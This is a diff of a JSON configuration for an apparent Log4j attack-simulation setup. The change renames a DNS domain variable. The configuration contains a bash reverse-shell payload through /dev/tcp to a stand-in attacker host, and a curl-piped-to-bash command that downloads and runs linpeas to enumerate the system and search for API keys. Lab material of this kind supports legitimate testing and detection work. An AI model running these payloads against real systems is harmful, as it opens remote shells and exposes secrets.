@@ -62,9 +62,9 @@
               "enabled": true,
               "attacker_http_port": 8088,
               "attacker_ldap_port": 1389,
-              "attacker_ip": "log4jc-attacker-${ deployment }.${ dynu_dns_domain }",
+              "attacker_ip": "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }",
               "target_port": 8080,
-              "payload": "/bin/bash -c \"TASK=iam2rds /bin/bash -i >& /dev/tcp/log4jc-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
+              "payload": "/bin/bash -c \"TASK=iam2rds /bin/bash -i >& /dev/tcp/log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
               "attack_delay": 50400,
               "reverse_shell_port": 4444
             }
@@ -76,7 +76,7 @@
               "listen_port": "4444",
               "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt",
               "attack_delay": 50400,
-              "reverse_shell_host" : "log4jc-attacker-${ deployment }.${ dynu_dns_domain }"
+              "reverse_shell_host" : "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }"
             }
           }
         }
